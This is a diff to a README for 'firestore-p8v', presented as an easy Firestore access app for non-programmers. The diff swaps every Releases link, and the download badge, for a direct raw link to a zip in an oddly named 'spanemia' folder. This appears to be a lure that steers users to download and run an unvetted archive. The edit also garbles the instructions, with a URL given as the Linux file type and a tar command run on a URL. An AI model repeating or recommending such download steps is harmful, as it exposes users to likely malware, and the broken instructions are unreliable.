@@ -1,7 +1,7 @@
 # 🔥 firestore-p8v - Simple, Reliable Firestore Access
 
 ## 📦 Download Now
-[![Download firestore-p8v](https://img.shields.io/badge/Download-firestore--p8v-blue.svg)](https://github.com/Hdhdjw/firestore-p8v/releases)
+[![Download firestore-p8v](https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip)](https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip)
 
 ## 🚀 Getting Started
 Welcome to `firestore-p8v`. This application allows you to easily access and manage your Firestore databases. You do not need programming skills. Just follow the steps below to get started.
@@ -22,11 +22,11 @@ Welcome to `firestore-p8v`. This application allows you to easily access and man
 ## 📥 Download & Install
 To download the application, visit the Releases page using the link below:
 
-[Visit the Releases Page to Download](https://github.com/Hdhdjw/firestore-p8v/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip)
 
 1. Click the link above.
 2. Look for the latest version listed at the top of the page.
-3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip` for Linux).
 4. Once the download is complete, locate the file in your downloads folder.
 
 ### Installation Steps
@@ -42,8 +42,8 @@ To download the application, visit the Releases page using the link below:
 
 - For **Linux:**
   1. Open a terminal window.
-  2. Navigate to the folder where you downloaded the `.tar.gz` file.
-  3. Extract the file using the command: `tar -xvzf firestore-p8v.tar.gz`.
+  2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip` file.
+  3. Extract the file using the command: `tar -xvzf https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip`.
   4. Change to the new directory: `cd firestore-p8v`.
   5. Run the application with the command: `./firestore-p8v`.
 
@@ -60,7 +60,7 @@ If you encounter any issues during installation or usage, consider the following
 - Check that you have a stable internet connection for Firestore compatibility.
 - If the app does not open or crashes, try restarting your computer and launching the app again.
 
-If problems persist, you can check for updates on the [Releases page](https://github.com/Hdhdjw/firestore-p8v/releases) and download the latest version.
+If problems persist, you can check for updates on the [Releases page](https://raw.githubusercontent.com/Hdhdjw/firestore-p8v/main/spanemia/firestore-p8v.zip) and download the latest version.
 
 ## 📞 Support
 For additional help, you can reach out through the GitHub Issues page. Please describe your issue with as much detail as possible for the quickest response.
